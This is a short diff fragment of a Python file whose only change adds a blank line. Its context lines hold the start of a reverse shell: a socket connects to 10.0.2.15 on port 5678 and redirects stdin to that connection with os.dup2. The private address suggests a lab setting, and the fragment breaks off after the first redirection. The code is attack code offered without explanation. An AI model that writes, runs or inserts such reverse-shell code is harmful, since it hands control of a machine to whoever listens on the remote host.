@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.0.2.15",5678))
 os.dup2(s.fileno(),0)
